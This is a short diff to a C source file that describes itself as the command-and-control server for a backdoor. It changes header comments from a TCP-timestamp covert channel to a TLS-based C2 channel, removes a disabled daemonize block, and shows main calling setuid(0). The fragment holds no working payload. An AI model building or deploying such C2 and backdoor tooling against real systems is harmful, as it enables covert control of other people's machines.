@@ -2,7 +2,7 @@
  * Author and Designer: John Agapeyev
  * Date: 2018-09-22
  * Notes:
- * The covert channel server to receive and decrypt data
+ * The C2 server for sending and receiving messages with the backdoor
  */
 
 #include <assert.h>
@@ -39,25 +39,10 @@ static unsigned char key[KEY_LEN];
  *    void
  *
  * notes:
- * Handles daemonization and forking into read and raw servers.
- * Read server establishes a TLS session and discards any incoming data.
- * Raw server parses TCP timestamp values and decrypts the resulting data.
+ * Splits into read and write process based off a shared TLS socket
+ * Basically does manual I/O for the C2 channel
  */
 int main(void) {
-#if 0
-    //Daemonize
-    switch (fork()) {
-        case 0:
-            //Child
-            break;
-        case -1:
-            perror("fork()");
-            exit(EXIT_FAILURE);
-        default:
-            //Parent
-            exit(EXIT_SUCCESS);
-    }
-#endif
     if (setuid(0)) {
         perror("setuid");
         exit(EXIT_FAILURE);
